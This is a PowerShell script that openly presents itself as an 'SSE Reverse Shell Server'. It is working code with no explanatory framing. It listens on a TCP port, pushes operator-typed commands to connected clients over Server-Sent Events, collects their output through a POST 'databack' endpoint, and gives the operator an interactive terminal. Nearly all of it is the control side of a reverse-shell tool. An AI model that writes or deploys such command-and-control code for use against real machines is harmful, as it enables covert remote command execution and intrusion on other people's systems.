<#
.SYNOPSIS
SSE Reverse Shell Server.

.DESCRIPTION
A raw TCP-based SSE server that pushes commands to connected clients over Server-Sent Events
and receives output via POST requests. Supports concurrent connections using runspaces.

.PARAMETER Port
The port on which the SSE server should listen.

.PARAMETER Headless
If specified, the server runs without the interactive terminal.

.NOTES
Author: TNCX-byte
License: MIT
#>

function Start-SseServer {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [int]$Port,

        [switch]$Headless
    )

# Port is passed as a parameter  # Define port globally

# ----- Run Server as a Background Runspace -----
$serverRunspace = [runspacefactory]::CreateRunspace()
$serverRunspace.Open()

# Create the PowerShell instance and add the server script.
$serverInstance = [PowerShell]::Create()
$serverInstance.AddScript({
    param($serverPort)  # This parameter will receive $port from the main script

    # ----- Global Setup -----
    $global:ServerState = [hashtable]::Synchronized(@{ ShutdownRequested = $false })
    Add-Type -AssemblyName System.Collections

    # 1. Normal SSE command queue:
    $global:SSEQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
    $queueRef = $global:SSEQueue

    # 2. Databack queue (for responses from Client B)
    $global:ClientDataQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
    $clientQueueRef = $global:ClientDataQueue

    $global:asyncJobs = @()

    # Use the passed parameter $serverPort (do not assign a new $port here)
    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $serverPort)
    $listener.Start()
    Write-Host "Server listening on port $serverPort..."
    $serverListener = $listener

    $minThreads = 1
    $maxThreads = 10
    $runspacePool = [runspacefactory]::CreateRunspacePool($minThreads, $maxThreads)
    $runspacePool.Open()

    # ----- Script Block: Process a Client Connection -----
    $scriptBlock = {
        param($client, $queue, $serverState, $serverListener, $clientDataQueue)
        try {
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            # Read the request line, e.g. "GET /sse HTTP/1.1" or "POST /post HTTP/1.1"
            $requestLine = $reader.ReadLine()
            if (-not $requestLine) { return }
            Write-Host "Received request: $requestLine" -ForegroundColor Cyan
            $tokens = $requestLine -split "\s+"
            $method = $tokens[0]
            $path   = $tokens[1]

            # Read headers.
            $headers = @{}
            while (($line = $reader.ReadLine()) -and $line.Trim() -ne "") {
                if ($line -match "^(.*?):\s*(.*)$") {
                    $headers[$matches[1].ToLower()] = $matches[2].Trim()
                }
            }

            $body = ""

            switch ($path) {

                "/sse" {
                    # SSE response headers
                    $writer.WriteLine("HTTP/1.1 200 OK")
                    $writer.WriteLine("Content-Type: text/event-stream")
                    $writer.WriteLine("Cache-Control: no-cache")
                    $writer.WriteLine("Connection: keep-alive")
                    $writer.WriteLine("")
                    $writer.Flush()

                    # Continuously send messages from the SSE queue
                    while (-not $serverState["ShutdownRequested"]) {
                        $msg = $null
                        while ($queue.IsEmpty -and -not $serverState["ShutdownRequested"]) {
                            Start-Sleep -Seconds 1
                        }
                        if ($queue.TryDequeue([ref]$msg)) {
                            $writer.WriteLine("data: $msg")
                            $writer.WriteLine("")
                            $writer.Flush()
                        }
                    }
                }
                "/hello" { $body = " Hello from PowerShell SSE server!" }
                "/time" {
                    Start-Sleep -Seconds 5
                    $body = "The time is: $(Get-Date)"
                }
                "/post" {
                    if ($method -eq "POST") {
                        $contentLength = 0
                        if ($headers.ContainsKey("content-length")) { [int]$contentLength = $headers["content-length"] }
                        if ($contentLength -gt 0) {
                            $buffer = New-Object Char[] $contentLength
                            $read = $reader.Read($buffer, 0, $contentLength)
                            if ($read -gt 0) { $body = -join $buffer[0..($read - 1)] }
                        }
                        # Shutdown command
                        if ($body -eq "shutdown") {
                            $serverState["ShutdownRequested"] = $true
                            $body = "Server is shutting down..."
                            $serverListener.Stop()
                        }
                        # Databack from Client B: message starts with "databack:"
                        elseif ($body.StartsWith("databack:")) {
                            $clientData = $body.Substring(9).Trim()
                            [void]$clientDataQueue.Enqueue($clientData)
                            $body = "Databack received."
                        }
                        else {
                            [void]$queue.Enqueue($body)
                            $timeout = 10; $interval = 1; $elapsed = 0
                            while ($clientDataQueue.IsEmpty -and $elapsed -lt $timeout) {
                                Start-Sleep -Seconds $interval
                                $elapsed += $interval
                            }
                            if (-not $clientDataQueue.IsEmpty) {
                                $databack = $clientDataQueue.ToArray() -join "`n"
                                while ($clientDataQueue.TryDequeue([ref]$null)) {}
                                $body = "Command processed. Databack received:`n$databack"
                            }
                            else {
                                $body = "Command processed but no databack received (timeout)."
                            }
                        }
                    }
                    else {
                        $body = " Use POST for /post endpoint."
                    }
                }
                default { $body = " Unknown endpoint: $path" }
            }

            if ($path -ne "/sse") {
                $byteCount = [System.Text.Encoding]::UTF8.GetByteCount($body)
                $response = "HTTP/1.1 200 OK`r`n" +
                            "Content-Type: text/plain; charset=utf-8`r`n" +
                            "Content-Length: $byteCount`r`n" +
                            "`r`n" + $body
                $writer.Write($response)
                $writer.Flush()
            }
        }
        catch {
            Write-Host "Error processing request: $_" -ForegroundColor Red
        }
        finally {
            try { $reader.Close() } catch { }
            try { $writer.Close() } catch { }
            try { $stream.Close() } catch { }
            try { $client.Close() } catch { }
        }
    }  # End of $scriptBlock

    # Main loop: Accept connections
    while (-not $global:ServerState["ShutdownRequested"]) {
        try {
            $client = $listener.AcceptTcpClient()
        }
        catch {
            if ($global:ServerState["ShutdownRequested"]) { break }
            continue
        }
        $psChild = [PowerShell]::Create()
        $psChild.RunspacePool = $runspacePool
        $scriptText = $scriptBlock.ToString()
        $psChild.AddScript($scriptText).AddArgument($client).AddArgument($queueRef).AddArgument($global:ServerState).AddArgument($serverListener).AddArgument($clientQueueRef) | Out-Null
        try {
            $asyncResult = $psChild.BeginInvoke()
            $global:asyncJobs += ,[PSCustomObject]@{ PS = $psChild; Async = $asyncResult }
        }
        catch {
            Write-Host "Error invoking runspace: $_" -ForegroundColor Red
            $psChild.Dispose()
        }
    }

    Write-Host "Shutdown requested. Waiting for active connections to finish..."
    foreach ($job in $global:asyncJobs) {
        try { $job.PS.EndInvoke($job.Async) }
        catch { Write-Host "Error ending runspace: $_" -ForegroundColor Red }
        finally { $job.PS.Dispose() }
    }

    Write-Host "Shutting down server gracefully..."
    $listener.Stop()
    $runspacePool.Close()
    $runspacePool.Dispose()
    Write-Host "Server has shut down."
}) | Out-Null

# Assign our runspace to the PowerShell instance.
$serverInstance.Runspace = $serverRunspace

# Pass the port value into the runspace before starting the script.
$serverInstance.AddArgument($port) | Out-Null

# Start the server script asynchronously.
$serverInstance.BeginInvoke() | Out-Null

Write-Host " Server started in the background on port $port."


if (-not $Headless) {
    $postUri = "http://localhost:$Port/post"
    $username = $env:USERNAME
    Write-Host "Waiting for an SSE client to connect..."

    while ($true) {
        try {
            $response = (iwr $postUri -Method POST -Body $username -ContentType "text/plain" -UseBasicParsing).Content
            if ($response -and -not ($response -match "no databack received")) {
                Write-Host "Client detected! Opening terminal..."
                break
            }

        }
        catch {
            Write-Host "No client detected. Retrying in 0.5 seconds..."
            Start-Sleep -Seconds 0.7
        }
    }

    while ($true) {
        $command = Read-Host "Enter command (or type 'exit' to quit terminal or 'shutdown' to shut server down)"
        if ($command -eq "exit") { break }
        try {
            $response = (iwr $postUri -Method POST -Body $command -ContentType "text/plain" -UseBasicParsing).Content
            Write-Host "`nServer Response:`n$response"
        }
        catch {
            Write-Warning "Error sending command to server: $_"
        }
    }

    Write-Host "Terminal closed. Server is still running in the background."
}

}
